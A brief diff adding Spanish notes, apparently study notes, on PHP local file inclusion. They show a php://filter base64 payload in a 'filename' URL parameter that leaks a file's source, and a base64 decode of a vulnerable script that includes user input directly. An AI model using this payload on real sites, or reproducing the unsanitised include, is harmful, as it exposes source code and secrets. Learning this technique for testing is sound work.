@@ -1,0 +1,11 @@
+
+## convertimos el codigo php a base64, copiamos el oneLiner y decodificamos el local
+
+
+::: localhost/example.php?filename=php://filter/convert.base64-encode/resource=example.php
+
+
+      # consola local, para poder leer el archivo php. por las cabeceras se interpreta, no deja leer el navegador
+      :(
+::: echo PD9waHAKICAkZmlsZSA9ICRfR0VUWydmaWxlbmFtZSddOwogIGluY2x1ZGUoJGZpbGUpOwo/Pgo= | base64 -d 
+
